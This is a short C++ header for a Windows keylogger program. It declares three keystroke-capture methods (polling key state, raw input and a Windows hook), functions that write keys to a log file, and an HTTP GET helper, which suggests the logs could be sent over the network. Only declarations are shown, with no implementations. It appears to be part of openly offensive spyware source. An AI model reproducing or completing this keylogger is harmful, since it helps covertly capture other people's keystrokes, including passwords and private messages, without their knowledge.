#define SECURITY_WIN32
#include <WinSock2.h>
#include <mstcpip.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <stdio.h>
#include <Windows.h>
#include <string>
#include <sspi.h>
#include <security.h>
#include <schannel.h>


using namespace std;

#pragma warning (disable : 4996)
#pragma comment (lib, "ws2_32.lib")
#pragma comment(lib, "fwpuclnt.lib")
#pragma comment(lib, "ntdsapi.lib")

extern bool caps, numLk, scrLk;

void KeyLogger_GetAsyncKeyState();
void KeyLogger_RawInput();
void KeyLogger_SetWindowsHook();
void Log(char* input, const char fileName[] = "Log.txt");
bool LogKey(int key);
char* GET(char* URL);

